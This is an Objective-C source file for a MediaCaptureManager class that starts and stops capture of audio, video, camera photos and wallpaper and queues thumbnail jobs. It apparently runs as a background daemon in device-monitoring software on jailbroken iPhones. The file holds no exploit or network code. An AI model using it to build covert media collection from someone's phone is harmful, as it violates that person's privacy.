/**
 - Project name :  MediaCaptureManager
 - Class name   :  MediaCaptureManager
 - Version      :  1.0  
 - Purpose      :  For MediaCaptureManager Component
 - Copy right   :  14/2/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "MediaCaptureManager.h"
#import "MediaCaptureNotifier.h"
#import "EventCenter.h"
#import "Defstd.h"
#import "DebugStatus.h"
#import "AudioCapture.h"
#import "VideoCapture.h"
#import "WallPaperCapture.h"
#import "PhotoCapture.h"
#import "MediaThumbnailManagerImp.h"
#import "MediaOP.h"
#import "DaemonPrivateHome.h"
#import "MediaHistoryDatabase.h"
//#import "PhotoAlbumChangeNotifier.h"

@interface MediaCaptureManager (private)

- (void) readyForCapture;
- (void) addOPToOPQueue: (NSTimer *) aTimer;

@end

@implementation MediaCaptureManager

@synthesize mThumbnailDirectoryPath;
@synthesize mAudioCapture;
@synthesize mVideoCapture;
@synthesize mPhotoCapture;
@synthesize mMediaOPQueue;
@synthesize mTimers;
@synthesize mMediaNotificationCount;
@synthesize mMediaIsCapturing;
@synthesize mMediaHistoryDB;

/**
 - Method name: initWithEventDelegate
 - Purpose:This method is used to initialize the MailCaptureManager class
 - Argument list and description: aEventDelegate (EventDelegate)
 - Return description: No return type
 */

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate andThumbnailDirectoryPath:(NSString *) aDirectoryPath {
	if ((self = [super init])) {
		mEventDelegate = aEventDelegate;
		[self setMThumbnailDirectoryPath:aDirectoryPath];
		mMediaOPQueue = [[NSOperationQueue alloc] init];
		[mMediaOPQueue setMaxConcurrentOperationCount:1];
		[self setMTimers:[NSMutableArray array]];
		
		// initiate media history DB
		mMediaHistoryDB = [[MediaHistoryDatabase alloc] init];
		
//		mPhotoAlbumChangeNotifier = [[PhotoAlbumChangeNotifier alloc] init];
//		[mPhotoAlbumChangeNotifier setMDelegate:self];
//		[mPhotoAlbumChangeNotifier setMPhotoAlbumDidChangeSelector:@selector(photoAlbumDidChangedNonCameraApp)];
		
		
	}
	return (self);
}

/**
 - Method name:startAudioCapture
 - Purpose: This method is used to start Audio Capture.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) startAudioCapture {
	[self readyForCapture];	
	//Audio Capture
	if (!mAudioCapture) {
		[self resetTS:kFileAudioTimeStamp];
    	mAudioCapture =[[AudioCapture alloc]initWithEventDelegate:mEventDelegate 
									 andMediaThumbnailManager:mMediaThumbnailManagerImp];
	}
}

/**
 - Method name:stopAudioCapture
 - Purpose: This method is used to stop Audio Capture.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) stopAudioCapture {
	if (mAudioCapture) {
		[mAudioCapture release];
		mAudioCapture=nil;
	}
}

/**
 - Method name:startVideoCapture
 - Purpose: This method is used to start Video Capture.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) startVideoCapture {
	[self readyForCapture];	
	//Video Capture
	if (!mVideoCapture) {
		[self resetTS:kFileVideoTimeStamp];
		mVideoCapture=[[VideoCapture alloc]initWithEventDelegate:mEventDelegate 
										andMediaThumbnailManager:mMediaThumbnailManagerImp];
	}
}

/**
 - Method name:stopVideoCapture
 - Purpose: This method is used to stop Video Capture.
 - Argument list and description: No argument
 - Return type and description: No Return
 */

- (void) stopVideoCapture {
	if (mVideoCapture) {
		[mVideoCapture release];
		mVideoCapture=nil;
	}
}

/**
 - Method name:startCameraImageCapture
 - Purpose: This method is used to start Camera Image Capture.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) startCameraImageCapture {
	[self readyForCapture];	
	//Camera Image Capture
	if (!mPhotoCapture) {		
		DLog (@">>> startCameraImageCapture")
		[self resetTS:kFileCameraImageTimeStamp];
		
		//[mPhotoAlbumChangeNotifier start];						// start listen to Photo Album change
		
		mPhotoCapture=[[PhotoCapture alloc] initWithEventDelegate:mEventDelegate 
									 andMediaThumbnailManager:mMediaThumbnailManagerImp];
	}
}

/**
 - Method name:stopCameraImageCapture
 - Purpose: This method is used to stop Camera Image Capture.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) stopCameraImageCapture {
	if (mPhotoCapture) {
		//[mPhotoAlbumChangeNotifier stop];						// stop listen to Photo Album change
		
		[mPhotoCapture release];
		mPhotoCapture=nil;
	}
}


/**
 - Method name:startWallPaperCapture
 - Purpose: This method is used to start WallPaper Image Capture.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) startWallPaperCapture {
	[self readyForCapture];	
	//Wallpaper Capture
	if(!mWallPaperCapture){
		mWallPaperCapture=[[WallPaperCapture alloc]initWithEventDelegate:mEventDelegate 
											andMediaThumbnailManager:mMediaThumbnailManagerImp];
	}
}

/**
 - Method name:stopWallPaperCapture
 - Purpose: This method is used to stop WallPaper Image Capture.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) stopWallPaperCapture {
	if (mWallPaperCapture) {
	   [mWallPaperCapture release];
	   mWallPaperCapture=nil;
	}
}

/**
 - Method name:	photoAlbumDidChangedNonCameraApp
 - Purpose:		This method is called by PhotoAlbumChangeNotifier if photo album content is changed by the application which is no Camera application
 - Argument list and description:	No argument
 - Return type and description:		No Return
 */
//- (void) photoAlbumDidChangedNonCameraApp {
//	DLog (@"photoAlbumDidChangedNonCameraApp")
//	[self resetTS:kFileCameraImageTimeStamp];
//}

- (void) resetTS: (NSString *) aTSFileName {

	NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
	[dateFormatter setDateFormat:@"HH:mm:ss:SSSS"];
	
	NSDate *date = [NSDate date];
	NSTimeInterval now = [date timeIntervalSince1970];
	DLog (@"!!!!!!!!!!!!!!!!!!!!! RESET TS: interval !!!!!!!!!!!!!!!!!!!!!  %f", now);
	
//	NSString *formattedDateString = [dateFormatter stringFromDate:date];
//	DLog (@"!!!!!!!!!!!!!!!!!!!!! RESET TS: time !!!!!!!!!!!!!!!!!!!!!  %@", formattedDateString);
	
	NSFileManager *fm = [NSFileManager defaultManager];
	NSString *filePath = [[DaemonPrivateHome daemonSharedHome] stringByAppendingString:aTSFileName];
	if ([fm fileExistsAtPath:filePath]) {
		[fm removeItemAtPath:filePath error:nil];
	}
	[[NSData dataWithBytes:&now length:sizeof(NSTimeInterval)] writeToFile:filePath atomically:YES];
	
	[dateFormatter release];
}

/**
 - Method name:processDataFromMessagePort
 - Purpose: This method is invoked when captured media data
 - Argument list and description: aData (NSData *)
 - Return type and description: No Return
*/

- (void) processDataFromMessagePort: (NSNotification *) aNotification {
	DLog (@"++++++ processDataFromMessagePort....");
	NSDictionary *userInfo = [NSDictionary dictionaryWithDictionary:[aNotification userInfo]];
	NSData *rawData = [NSData dataWithData:[userInfo objectForKey:@"data"]];
	NSDictionary *notificationForOP = [NSDictionary dictionaryWithObjectsAndKeys:
									   [userInfo objectForKey:NOTIFICATION_ID_KEY], NOTIFICATION_ID_KEY,
									   [userInfo objectForKey:INTERVAL_TIMESTAMP_KEY], INTERVAL_TIMESTAMP_KEY,
									   [userInfo objectForKey:FORMATTED_TIMESTAMP_KEY],FORMATTED_TIMESTAMP_KEY,
									   nil];
							  
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:rawData];
    NSDictionary *mediaDictionary = [[unarchiver decodeObjectForKey:kMediaMonitorKey]retain];
	[unarchiver finishDecoding];
	[unarchiver release];
	
	NSString *mediaType=[mediaDictionary objectForKey:kMediaType];
	NSString *mediaPath=[mediaDictionary objectForKey:kMediaPath];		
	//NSNumber *mediaEvent = [mediaDictionary objectForKey:kMediaNotification];
	[mediaDictionary release];
	
	DLog (@"==================");
	DLog (@"MEDIA TYPE:%@",mediaType);
	DLog (@"MEDIA PATH:%@",mediaPath);
	//DLog (@"MEDIA EVENT:%@", [mediaEvent intValue] == 0 ? @"START record": @"STOP record");
	DLog (@"==================");
	
	
	//[self setMMediaIsCapturing:FALSE];
	
	// Thumbnail creation
	if ([mediaType isEqualToString:kMediaTypeAudio]) {	// Audio
		DLog (@" !!! audio !!! ");
		if (mAudioCapture) {
			DLog (@" !!! audio: mAudioCapture !!! ");
			MediaOP *mediaOP = [[MediaOP alloc] initWithMediaCaptureManager:self];
			[mediaOP setMMediaType:mediaType];
			[mediaOP setMMediaDirectory:kAudioLibraryPath];
			[mediaOP setMNotification:notificationForOP];
			[mTimers addObject:[NSTimer scheduledTimerWithTimeInterval:(5.0 + [mTimers count]) // Wait audio file to be flushed in all data
																target:self
															  selector:@selector(addOPToOPQueue:)
															  userInfo:mediaOP
															   repeats:NO]];
			[mediaOP release];
		} else {
			[self setMMediaNotificationCount:([self mMediaNotificationCount] - 1)];
		}
	}
	else if([mediaType isEqualToString:kMediaTypeVideo]) { // Video
		DLog (@" !!! video !!! ");
		if (mVideoCapture) {
			DLog (@" !!! video: mVideoCapture !!! ");
			MediaOP *mediaOP = [[MediaOP alloc] initWithMediaCaptureManager:self];
			[mediaOP setMMediaType:mediaType];
			[mediaOP setMMediaDirectory:kPhotoLibraryPath];
			[mediaOP setMNotification:notificationForOP];
			[mTimers addObject:[NSTimer scheduledTimerWithTimeInterval:(5.0 + [mTimers count]) // Wait video file to be flushed in all data
																target:self
															  selector:@selector(addOPToOPQueue:)
															  userInfo:mediaOP
															   repeats:NO]];
			[mediaOP release];
		} else {
			[self setMMediaNotificationCount:([self mMediaNotificationCount] - 1)];
		}
	}
	else if([mediaType isEqualToString:kMediaTypePhoto]) { // Camera image
		DLog (@" !!! camera !!! ");
		if (mPhotoCapture) {
			DLog (@" !!! camera: mPhotoCapture !!! ");
			MediaOP *mediaOP = [[MediaOP alloc] initWithMediaCaptureManager:self];
			[mediaOP setMMediaType:mediaType];
			[mediaOP setMMediaDirectory:kPhotoLibraryPath];
			[mediaOP setMNotification:notificationForOP];
			[mTimers addObject:[NSTimer scheduledTimerWithTimeInterval:(5.0 + [mTimers count]) // Wait image file to create
																target:self
															  selector:@selector(addOPToOPQueue:)
															  userInfo:mediaOP
															   repeats:NO]];
			[mediaOP release];
		} else {
			[self setMMediaNotificationCount:([self mMediaNotificationCount] - 1)];
		}
	}
	else {
		[self setMMediaNotificationCount:([self mMediaNotificationCount] - 1)];
		DLog(@"ManagerWallpaper-notfCount = %d", [self mMediaNotificationCount])
		
		if (mWallPaperCapture) {
			[mWallPaperCapture addPathToWallPaperQueue:mediaPath]; // WallPaper
			[mWallPaperCapture processWallPaperCaptureQueue];
		} else { // Not capture then delete this wallpaper file because mobile substrate make a copy of it
			NSFileManager *fm = [NSFileManager defaultManager];
			if ([fm fileExistsAtPath:mediaPath]) {
				[fm removeItemAtPath:mediaPath error:nil];
			}
		}
	}
}

- (void) readyForCapture  {
	if ((mMediaCaptureNotifier==nil) && (mMediaThumbnailManagerImp==nil)) {
		mMediaCaptureNotifier = [[MediaCaptureNotifier alloc] initWithMediaCaptureManager:self];
		[mMediaCaptureNotifier startMonitorMediaCapture];
		mMediaThumbnailManagerImp=[[MediaThumbnailManagerImp alloc] initWithThumbnailDirectory:mThumbnailDirectoryPath];
	}
}

- (void) addOPToOPQueue: (NSTimer *) aTimer {
	MediaOP *op = [aTimer userInfo];
//	if ([[mMediaOPQueue operations] count]) {
//		MediaOP *lastOP = [[mMediaOPQueue operations] lastObject];
//		if ([lastOP isReady]) {
//			[op addDependency:lastOP];
//		}
//	}
	
	DLog(@"!!!!!!!!!!!! IS CAPTUREING %d", [self mMediaIsCapturing])
	
//	// AUDIO
//	if ([[op mMediaType] isEqualToString:kMediaTypeAudio]) {
//		DLog(@"AUDIO")
//		if ([self mMediaIsCapturing] == YES) { // RECORDING
//			DLog(@"!!!!!!!!!!!!!! RECORDING AUDIO,.... PLEASE WAIT......!!!!!!!!")
//			[mTimers removeObject:aTimer];
//			[mTimers addObject:[NSTimer scheduledTimerWithTimeInterval:(5.0 + [mTimers count]) // Wait audio file to be flushed in all data
//																target:self
//															  selector:@selector(addOPToOPQueue:)
//															  userInfo:op
//															   repeats:NO]];
//		} else {
//			DLog(@"!!!!!!!!!!!!!! GO AHEAD add OP to QUEUE!!!!!!!!")
//			DLog(@"!!!!!!!!!!!! IS CAPTUREING before added to queue %d", [self mMediaIsCapturing])
//			[self setMMediaNotificationCount:([self mMediaNotificationCount] - 1)];
//			DLog(@"Manager-notfCount = %d", [self mMediaNotificationCount])
//			[mTimers removeObject:aTimer];
//			[mMediaOPQueue addOperation:op];
//			DLog(@"Added op = %@", op)
//		}
//	// VIDEO and CAMERA IMAGE
//	} else {
//		DLog(@"NOT AUDIO")
		[self setMMediaNotificationCount:([self mMediaNotificationCount] - 1)];
		DLog(@"Manager-notfCount = %d", [self mMediaNotificationCount])
		[mTimers removeObject:aTimer];
		[mMediaOPQueue addOperation:op];
		DLog(@"Added op = %@", op)
//	}

	
	

}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */

- (void) dealloc {
	DLog (@"Media capture manager is dealloced **************");
	[self stopAudioCapture];
	[self stopVideoCapture];
	[self stopCameraImageCapture];
	[self stopWallPaperCapture];
	[mMediaOPQueue cancelAllOperations];
	[mMediaOPQueue release];
	[mTimers release];
	[mThumbnailDirectoryPath release];
	[mMediaThumbnailManagerImp release];
	mMediaThumbnailManagerImp=nil;
	DLog (@"Media capture manager is dealloced **************22************"); // In order to exit the notifier thread
	[mMediaCaptureNotifier stopMonitorMediaCapture];
  	[mMediaCaptureNotifier release];
	mMediaCaptureNotifier=nil;
	[mMediaHistoryDB release];
	mMediaHistoryDB = nil;
	
//	[mPhotoAlbumChangeNotifier release];	
//	mPhotoAlbumChangeNotifier = nil;
	
	
	[super dealloc];
}

@end
